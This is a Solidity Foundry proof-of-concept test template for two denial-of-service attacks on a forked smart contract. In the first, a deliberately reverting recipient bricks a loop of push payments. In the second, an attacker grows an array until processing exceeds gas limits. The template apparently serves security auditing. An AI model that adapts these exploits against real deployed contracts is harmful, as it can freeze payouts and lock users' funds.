// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Denial of service (revert-in-loop + unbounded loop)
/// @notice (a) Revert-in-loop: the target pays recipients in a LOOP
///         (push payments). ONE recipient that reverts bricks the WHOLE
///         distribution -- nobody gets paid.
///         (b) Unbounded loop: the target iterates an array anyone can
///             grow. Gas grows with the array until the function exceeds
///             the block gas limit and can NEVER run again.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt distribute() / addRecipient()
///      / push() / process() to the target's real functions.

contract Reverter {
    receive() external payable {
        revert("recipient always reverts");
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_revertInLoopBricksDistribution() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        Reverter reverter = new Reverter();

        // TODO: adapt to the target's real recipient-adding function.
        vm.prank(attackerEOA);
        (bool addOk,) = target.call(
            abi.encodeWithSignature("addRecipient(address)", address(reverter))
        );
        require(addOk, "addRecipient failed -- adapt to the target's recipient function");

        // TODO: adapt to the target's real distribution function.
        (bool ok,) = target.call(abi.encodeWithSignature("distribute()"));
        console.log("distribute() ok with a reverting recipient:", ok);
        assertTrue(!ok, "exploit did not reproduce: distribution survived the reverting recipient");
    }

    function test_unboundedLoopGasGrowth() public {
        // TODO: adapt push() / process() to the target's real functions.
        // Grow the array in two steps and compare process() gas.
        for (uint256 i = 0; i < 25; i++) {
            (bool ok,) = target.call(abi.encodeWithSignature("push(uint256)", i));
            require(ok, "push failed -- adapt to the target's array-growth function");
        }
        uint256 gasBefore = gasleft();
        (bool ok1,) = target.call(abi.encodeWithSignature("process()"));
        uint256 gas1 = gasBefore - gasleft();
        require(ok1, "process() failed at 25 entries");

        for (uint256 i = 25; i < 50; i++) {
            (bool ok,) = target.call(abi.encodeWithSignature("push(uint256)", i));
            require(ok, "push failed");
        }
        gasBefore = gasleft();
        (bool ok2,) = target.call(abi.encodeWithSignature("process()"));
        uint256 gas2 = gasBefore - gasleft();
        require(ok2, "process() failed at 50 entries");

        console.log("process() gas at 25 entries:", gas1);
        console.log("process() gas at 50 entries:", gas2);
        assertGt(gas2, gas1, "exploit did not reproduce: process() gas does not grow with the array");
    }
}
